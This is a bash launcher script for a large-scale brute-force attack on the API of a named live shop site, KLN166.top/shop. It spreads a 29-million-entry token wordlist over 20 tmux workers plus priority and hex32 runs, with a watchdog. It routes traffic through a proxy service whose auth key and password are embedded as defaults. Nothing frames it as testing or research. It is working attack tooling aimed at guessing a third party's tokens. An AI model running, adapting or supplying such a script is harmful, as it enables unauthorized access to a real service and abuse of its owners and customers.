#!/bin/bash
# Hot-reload KLN166 workers with faster settings (preserves progress)
set -euo pipefail

OUT=/data/automation/results/kln166.top/kami_attack_20260718
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
PRI=/data/wordlists/faka/kln166-priority.txt
HEX=/data/wordlists/faka/kln166-hex32-sample.txt
TOTAL=29452734
WORKERS=20
THREADS="${THREADS:-60}"
PRI_THREADS="${PRI_THREADS:-80}"
CHUNK=$((TOTAL / WORKERS))

export QG_AUTHKEY="${QG_AUTHKEY:-C413ED6D}"
export QG_AUTHPWD="${QG_AUTHPWD:-344F550A6F8B}"
export FFFZZ_TURBO=1
export FAKA_DIRECT=1
export FFFZZ_TIMEOUT=3
export FAKA_FAST_KEY=1
export FAKA_BATCH=8000
export FAKA_BASE="https://KLN166.top/shop/"
export FAKA_OUT="$OUT"

# Do not overwrite bin script from /tmp — deploy via scp to $BIN/faka_api_brute_fast.py first
bash "$BIN/qg-proxy-warm.sh" "$OUT" 2>/dev/null || true

for s in $(tmux ls 2>/dev/null | grep -E '^kln-' | cut -d: -f1); do
  tmux kill-session -t "$s" 2>/dev/null || true
done

for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux new-session -d -s "kln-api-$w" \
    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $WL $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
  sleep 0.1
done

tmux new-session -d -s kln-priority \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $PRI 0 0 $PRI_THREADS 99 $OUT 2>&1 | tee -a $OUT/priority.log"

tmux new-session -d -s kln-hex32 \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $HEX 0 0 $PRI_THREADS 98 $OUT 2>&1 | tee -a $OUT/hex32.log"

tmux new-session -d -s kln-watch "WORKERS=$WORKERS THREADS=$THREADS FAKA_BASE=$FAKA_BASE bash $BIN/kln166_watchdog.sh"

echo "KLN166 FAST reload: ${WORKERS}x${THREADS} DIRECT timeout=3s batch=8000 requests-pool"
tmux ls | grep kln-
